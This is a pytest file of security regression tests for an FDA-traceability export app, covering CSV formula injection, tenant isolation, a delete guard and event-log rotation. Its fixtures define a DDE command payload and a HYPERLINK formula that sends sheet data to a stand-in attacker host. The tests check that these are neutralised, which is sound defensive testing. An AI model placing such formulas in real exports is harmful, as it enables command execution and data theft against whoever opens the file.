"""Security review follow-ups from #65.

One test file per finding, in the issue's own order:

1. CSV formula injection in the FDA-request export (Medium).
2. Tenant isolation with Basic Auth disabled (Medium) -- including a
   regression guard for the half of the finding that did not reproduce.
3. The operator delete's defensive ``rmtree`` guard (Low).
4. ``EventStore`` reads served from memory rather than a full re-parse (Low),
   with the durability properties they must not cost.
5. In-memory history versus an unbounded file (Low).
"""

from __future__ import annotations

import base64
import csv
import io
from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from app import tenancy
from app.fda_export import (
    CSV_FORMULA_PREFIXES,
    FDA_EXPORT_COLUMNS,
    neutralize_csv_cell,
    render_fda_request_csv,
)
from app.main import app, controller
from app.schemas.domain import CTEType, DestinationMode, RegEngineEvent, StoredEventRecord
from app.store import EventStore


client = TestClient(app)

BASE_TIME = datetime(2026, 5, 4, 9, 0, tzinfo=UTC)


def basic_auth_header(username: str, password: str) -> dict[str, str]:
    token = base64.b64encode(f"{username}:{password}".encode("utf-8")).decode("ascii")
    return {"Authorization": f"Basic {token}"}

# The DDE payload from the issue, plus the quieter form that matters more in
# practice: a formula that silently ships the rest of the sheet to a host of
# the attacker's choosing when the reviewer opens the compliance artifact.
DDE_PAYLOAD = "=cmd|'/c calc'!A1"
EXFIL_PAYLOAD = '=HYPERLINK("https://attacker.example/?x="&A1,"Click")'


def make_event(
    lot_code: str = "TLC-SEC65-000001",
    *,
    minutes: int = 0,
    cte_type: CTEType = CTEType.HARVESTING,
    product_description: str = "Romaine Lettuce",
    location_name: str = "Valley Fresh Farms",
    kdes: dict | None = None,
) -> RegEngineEvent:
    return RegEngineEvent(
        cte_type=cte_type,
        traceability_lot_code=lot_code,
        product_description=product_description,
        quantity=100,
        unit_of_measure="cases",
        location_name=location_name,
        timestamp=BASE_TIME + timedelta(minutes=minutes),
        kdes=kdes or {},
    )


def make_record(**kwargs) -> StoredEventRecord:
    return StoredEventRecord(
        payload_source="test-suite",
        event=make_event(**kwargs),
        parent_lot_codes=[],
        destination_mode=DestinationMode.NONE,
        delivery_status="generated",
    )


def parse_csv(csv_text: str) -> tuple[list[str], list[dict[str, str]]]:
    """Split an export into its (optional) banner lines and its parsed rows."""
    lines = csv_text.splitlines()
    banner = []
    while lines and lines[0].startswith("#"):
        banner.append(lines.pop(0))
    reader = csv.DictReader(io.StringIO("\n".join(lines)))
    return banner, list(reader)


# --- 1. CSV formula injection ----------------------------------------------


class TestCsvFormulaInjection:
    @pytest.mark.parametrize("prefix", CSV_FORMULA_PREFIXES)
    def test_every_formula_prefix_is_neutralized(self, prefix):
        assert neutralize_csv_cell(f"{prefix}danger") == f"'{prefix}danger"

    def test_ordinary_values_and_numbers_are_untouched(self):
        assert neutralize_csv_cell("Romaine Lettuce") == "Romaine Lettuce"
        assert neutralize_csv_cell("") == ""
        # A number cannot carry a formula, and quoting it would change what
        # the Quantity column means to whoever sums it.
        assert neutralize_csv_cell(500) == 500
        assert neutralize_csv_cell(-3.5) == -3.5

    def test_the_kdes_named_in_the_finding_cannot_become_formulas(self):
        record = make_record(
            cte_type=CTEType.SHIPPING,
            product_description=DDE_PAYLOAD,
            location_name=EXFIL_PAYLOAD,
            kdes={
                "reference_document_type": "@SUM(1+9)*cmd|' /C calc'!A0",
                "reference_document_number": "+1+1",
                "ship_to_location": "-2+3",
                "tlc_source_reference": "\tSRC-0001",
            },
        )

        _, rows = parse_csv(render_fda_request_csv([record], location_gln=lambda name: name))

        assert len(rows) == 1
        row = rows[0]
        assert row["Product Description"] == f"'{DDE_PAYLOAD}"
        assert row["Location Description"] == f"'{EXFIL_PAYLOAD}"
        assert row["Reference Document Type"].startswith("'@")
        assert row["Reference Document Number"] == "'+1+1"
        assert row["Immediate Subsequent Recipient Location"] == "'-2+3"
        assert row["Traceability Lot Code Source Reference"] == "'\tSRC-0001"
        # Neutralized, not mangled: the reviewer still sees the real value.
        assert row["Product Description"].lstrip("'") == DDE_PAYLOAD

    def test_no_exported_cell_can_open_as_a_formula(self):
        """The guarantee is per-column, so a new column cannot reopen this."""
        hostile = "=1+1"
        record = make_record(
            cte_type=CTEType.RECEIVING,
            product_description=hostile,
            location_name=hostile,
            kdes={key: hostile for key in ("receiving_location", "immediate_previous_source", "reference_document_type", "reference_document_number", "ship_to_location", "tlc_source_reference", "traceability_lot_code_description")},
        )

        _, rows = parse_csv(render_fda_request_csv([record], location_gln=lambda name: name))

        for column, value in rows[0].items():
            assert not value.startswith(CSV_FORMULA_PREFIXES), f"{column} opens as a formula"

    def test_export_endpoint_keeps_its_columns_and_truncation_banner(self, tmp_path):
        """Neutralization must not disturb the 15 columns or the banner."""
        reset = client.post(
            "/api/simulate/reset",
            json={"batch_size": 1, "seed": 204, "persist_path": str(tmp_path / "events.jsonl")},
        )
        assert reset.status_code == 200
        controller.store.add_many(
            [
                make_record(lot_code="TLC-SEC65-00000A", product_description=DDE_PAYLOAD),
                make_record(lot_code="TLC-SEC65-00000B", minutes=5),
                make_record(lot_code="TLC-SEC65-00000C", minutes=10),
            ]
        )

        response = client.get("/api/mock/regengine/export/fda-request?limit=1")
        assert response.status_code == 200
        assert response.headers["X-Export-Truncated"] == "true"

        banner, rows = parse_csv(response.text)
        assert banner and banner[0].startswith("# PARTIAL EXPORT")
        assert list(rows[0].keys()) == FDA_EXPORT_COLUMNS
        assert len(FDA_EXPORT_COLUMNS) == 15
        assert rows[0]["Product Description"] == f"'{DDE_PAYLOAD}"


# --- 2. Tenant isolation without Basic Auth ---------------------------------


class TestTenantIsolationWithoutAuth:
    def test_the_tenant_header_routes_storage_even_with_auth_disabled(self):
        """#65 read ``uses_default_storage`` as "true whenever auth is off".

        It is not: the tenant id has to be the default one as well. Without
        this test the finding's proposed "fix" (drop the auth half) reads
        like the safe direction, when dropping the *tenant* half is what
        would actually collapse every caller onto the shared store.
        """
        tenant_status = client.get(
            "/api/simulate/status", headers={"X-RegEngine-Tenant": "sec65-routing"}
        )
        default_status = client.get("/api/simulate/status")

        assert tenant_status.status_code == 200
        tenant_path = Path(tenant_status.json()["config"]["persist_path"])
        default_path = Path(default_status.json()["config"]["persist_path"])
        assert tenant_path != default_path
        assert tenant_path.parent == tenancy.tenant_dir("sec65-routing")

    def test_a_persist_path_may_not_reach_into_another_tenants_storage(self):
        """The default no-auth caller must not be able to name tenant storage.

        ``EventStore.reset`` unlinks its persist path, so before this guard a
        plain unauthenticated ``POST /api/simulate/reset`` naming another
        tenant's events file deleted that tenant's log -- the exact thing
        SECURITY_BOUNDARIES.md says reset cannot do.
        """
        victim = "sec65-victim"
        seeded = client.post("/api/simulate/step", headers={"X-RegEngine-Tenant": victim})
        assert seeded.status_code == 200
        victim_log = tenancy.tenant_events_path(victim)
        assert victim_log.exists()
        size_before = victim_log.stat().st_size

        for path in (str(victim_log), str(tenancy.TENANT_DATA_ROOT)):
            response = client.post(
                "/api/simulate/reset",
                json={"batch_size": 1, "seed": 204, "persist_path": path},
            )
            assert response.status_code == 400, path
            assert "tenant" in response.json()["detail"].lower()

        assert victim_log.exists()
        assert victim_log.stat().st_size == size_before

    def test_the_default_data_root_is_still_a_usable_persist_path(self, tmp_path):
        """The guard is about tenant storage only; local demos keep working."""
        response = client.post(
            "/api/simulate/reset",
            json={"batch_size": 1, "seed": 204, "persist_path": str(tmp_path / "events.jsonl")},
        )
        assert response.status_code == 200


# --- 3. Operator delete defensive assert ------------------------------------


class TestOperatorDeleteGuard:
    def test_a_real_tenant_directory_passes(self):
        directory = tenancy.tenant_dir("sec65-deletable")
        assert tenancy.assert_deletable_tenant_dir(directory) == directory

    @pytest.mark.parametrize(
        "directory",
        [
            tenancy.TENANT_DATA_ROOT,
            tenancy.TENANT_DATA_ROOT / "..",
            tenancy.DATA_ROOT,
            Path("/"),
        ],
    )
    def test_anything_outside_a_tenant_directory_is_refused(self, directory):
        with pytest.raises(RuntimeError):
            tenancy.assert_deletable_tenant_dir(directory)

    def test_a_symlinked_tenant_directory_cannot_redirect_the_delete(self, tmp_path):
        tenancy.TENANT_DATA_ROOT.mkdir(parents=True, exist_ok=True)
        elsewhere = tmp_path / "not-a-tenant"
        elsewhere.mkdir()
        link = tenancy.TENANT_DATA_ROOT / "sec65-symlink"
        if link.exists() or link.is_symlink():
            link.unlink()
        link.symlink_to(elsewhere, target_is_directory=True)
        try:
            with pytest.raises(RuntimeError):
                tenancy.assert_deletable_tenant_dir(link)
        finally:
            link.unlink()

    def test_the_operator_delete_route_still_deletes(self, monkeypatch):
        monkeypatch.setenv("REGENGINE_BASIC_AUTH_USERNAME", "demo-user")
        monkeypatch.setenv("REGENGINE_BASIC_AUTH_PASSWORD", "demo-pass")
        operator_headers = basic_auth_header("demo-user", "demo-pass")
        tenant = "sec65-operator-delete"
        seeded = client.post(
            "/api/simulate/step",
            headers=operator_headers | {"X-RegEngine-Tenant": tenant},
        )
        assert seeded.status_code == 200
        assert tenancy.tenant_dir(tenant).exists()

        response = client.delete(f"/api/operator/tenants/{tenant}", headers=operator_headers)

        assert response.status_code == 200
        assert response.json()["removed_data"] is True
        assert not tenancy.tenant_dir(tenant).exists()


# --- 4. Reads served from memory --------------------------------------------


class TestReadsDoNotReparseTheLog:
    def test_read_paths_never_touch_the_file(self, tmp_path, monkeypatch):
        store = EventStore(persist_path=str(tmp_path / "events.jsonl"))
        store.add_many(
            [
                make_record(lot_code="TLC-SEC65-READ-1"),
                make_record(
                    lot_code="TLC-SEC65-READ-2",
                    minutes=5,
                    kdes={"source_traceability_lot_code": "TLC-SEC65-READ-1"},
                ),
            ]
        )

        def explode(*args, **kwargs):  # pragma: no cover - only runs on regression
            raise AssertionError("read path re-parsed the persisted log")

        monkeypatch.setattr(store, "read_persisted_records", explode)

        assert store.stats()["total_records"] == 2
        assert len(store.all_between()) == 2
        assert len(store.lineage("TLC-SEC65-READ-2")) == 2
        assert len(store.recent()) == 2
        assert store.failed_delivery_records() == []

    def test_the_log_is_still_the_source_of_truth_on_restart(self, tmp_path):
        persist_path = tmp_path / "events.jsonl"
        store = EventStore(persist_path=str(persist_path))
        store.add_many([make_record(lot_code="TLC-SEC65-WAL-1")])

        reloaded = EventStore(persist_path=str(persist_path))

        assert [record.event.traceability_lot_code for record in reloaded.all_between()] == [
            "TLC-SEC65-WAL-1"
        ]

    def test_a_failed_write_is_not_visible_to_the_memory_read_path(self, tmp_path, monkeypatch):
        """Serving reads from memory must not expose an unpersisted record."""
        persist_path = tmp_path / "events.jsonl"
        store = EventStore(persist_path=str(persist_path))
        store.add_many([make_record(lot_code="TLC-SEC65-DUR-1")])

        real_open = type(persist_path).open

        def failing_open(self, mode="r", *args, **kwargs):
            if self == store.persist_path and "r" not in mode:
                raise OSError(28, "No space left on device")
            return real_open(self, mode, *args, **kwargs)

        monkeypatch.setattr(type(persist_path), "open", failing_open)
        with pytest.raises(OSError):
            store.add_many([make_record(lot_code="TLC-SEC65-DUR-2", minutes=5)])
        monkeypatch.undo()

        assert store.stats()["total_records"] == 1
        assert [record.event.traceability_lot_code for record in store.all_between()] == [
            "TLC-SEC65-DUR-1"
        ]

    def test_a_malformed_line_is_still_skipped_and_quarantined(self, tmp_path):
        persist_path = tmp_path / "events.jsonl"
        store = EventStore(persist_path=str(persist_path))
        store.add_many([make_record(lot_code="TLC-SEC65-BAD-1")])
        with persist_path.open("a", encoding="utf-8") as handle:
            handle.write("this is not json\n")

        reloaded = EventStore(persist_path=str(persist_path))

        assert reloaded.last_read_skipped == 1
        assert [record.event.traceability_lot_code for record in reloaded.all_between()] == [
            "TLC-SEC65-BAD-1"
        ]
        assert persist_path.with_suffix(".jsonl.quarantine").exists()

    def test_secrets_are_still_scrubbed_on_every_write_path(self, tmp_path):
        persist_path = tmp_path / "events.jsonl"
        store = EventStore(persist_path=str(persist_path))
        stored = store.add_many(
            [make_record(lot_code="TLC-SEC65-SEC-1", kdes={"api_key": "super-secret"})]
        )
        store.update_many([stored[0].model_copy(update={"delivery_status": "posted"})])

        assert "super-secret" not in persist_path.read_text(encoding="utf-8")


# --- 5. Memory/file divergence ----------------------------------------------


class TestRetentionKeepsMemoryAndFileTogether:
    def test_the_log_is_rotated_instead_of_growing_without_bound(self, tmp_path):
        persist_path = tmp_path / "events.jsonl"
        store = EventStore(persist_path=str(persist_path), max_records=4, max_history=4)
        # Slack is max(1, 4 // 10) == 1, so the file may run one record past
        # the bound before it is rotated.
        for index in range(12):
            store.add_many([make_record(lot_code=f"TLC-SEC65-ROT-{index:04d}", minutes=index)])

        on_disk = store.read_persisted_records()
        in_memory = store.all_between()

        assert len(in_memory) == 4
        assert len(on_disk) <= store.max_history + store._rotation_slack
        # What the store serves and what the live log holds are the same set.
        assert {record.record_id for record in on_disk} >= {
            record.record_id for record in in_memory
        }
        assert [record.event.traceability_lot_code for record in in_memory] == [
            f"TLC-SEC65-ROT-{index:04d}" for index in range(8, 12)
        ]

    def test_rotated_records_are_archived_rather_than_dropped(self, tmp_path):
        persist_path = tmp_path / "events.jsonl"
        store = EventStore(persist_path=str(persist_path), max_records=2, max_history=2)
        for index in range(10):
            store.add_many([make_record(lot_code=f"TLC-SEC65-ARC-{index:04d}", minutes=index)])

        archive = persist_path.with_suffix(".jsonl.1")
        assert archive.exists()
        archived = [line for line in archive.read_text(encoding="utf-8").splitlines() if line.strip()]
        assert archived, "rotation deleted records instead of archiving them"
        assert "TLC-SEC65-ARC-0000" in archived[0]

    def test_a_reload_after_rotation_sees_exactly_the_retained_records(self, tmp_path):
        persist_path = tmp_path / "events.jsonl"
        store = EventStore(persist_path=str(persist_path), max_records=3, max_history=3)
        for index in range(9):
            store.add_many([make_record(lot_code=f"TLC-SEC65-RLD-{index:04d}", minutes=index)])
        served = [record.record_id for record in store.all_between()]

        reloaded = EventStore(persist_path=str(persist_path), max_records=3, max_history=3)

        assert [record.record_id for record in reloaded.all_between()] == served
        # Sequence numbering continues from the retained tail rather than
        # restarting and colliding with archived records.
        assert reloaded._counter == store._counter

    def test_an_oversized_inherited_log_is_trimmed_on_load(self, tmp_path):
        persist_path = tmp_path / "events.jsonl"
        unbounded = EventStore(persist_path=str(persist_path), max_records=50, max_history=50)
        for index in range(20):
            unbounded.add_many([make_record(lot_code=f"TLC-SEC65-INH-{index:04d}", minutes=index)])
        assert len(unbounded.read_persisted_records()) == 20

        trimmed = EventStore(persist_path=str(persist_path), max_records=5, max_history=5)

        assert len(trimmed.all_between()) == 5
        assert len(trimmed.read_persisted_records()) == 5
        assert [record.event.traceability_lot_code for record in trimmed.all_between()] == [
            f"TLC-SEC65-INH-{index:04d}" for index in range(15, 20)
        ]

    def test_reset_clears_the_archive_too(self, tmp_path):
        persist_path = tmp_path / "events.jsonl"
        store = EventStore(persist_path=str(persist_path), max_records=2, max_history=2)
        for index in range(8):
            store.add_many([make_record(lot_code=f"TLC-SEC65-RST-{index:04d}", minutes=index)])
        assert persist_path.with_suffix(".jsonl.1").exists()

        store.reset()

        assert not persist_path.with_suffix(".jsonl.1").exists()
        assert store.all_between() == []
